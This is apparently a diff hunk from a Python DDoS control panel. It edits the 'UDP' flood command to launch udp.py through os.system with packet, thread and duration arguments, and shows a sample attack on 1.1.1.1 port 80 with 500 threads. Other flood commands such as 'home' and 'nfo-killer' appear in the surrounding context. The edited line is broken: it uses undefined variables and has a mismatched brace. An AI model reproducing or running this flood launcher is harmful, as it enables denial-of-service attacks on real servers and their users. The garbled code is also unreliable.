@@ -336,14 +336,14 @@ def main():
                 print('Usage: home <ip> <port> <packet_size> <time>')
                 print('Example: home 1.1.1.1 80 65500 60')
 
-        elif "udp" in cnc:
+        elif "UDP" in cnc:
             try:
                 ip = cnc.split()[1]
                 port = cnc.split()[2]
-                os.system(f'python2 udp.py {ip} {port} 0 0')
+                os.system(f'python udp.py {ip} {port} {packet} {thread} (time} 0 0 0 0 0')
             except IndexError:
-                print('Usage: udp <ip> <port>')
-                print('Example: udp 1.1.1.1 80')
+                print('Usage: UDP <ip> <port> <packet> <thread> <time>')
+                print('Example: UDP 1.1.1.1 80 5000000 500 200')
 
         elif "nfo-killer" in cnc:
             try:
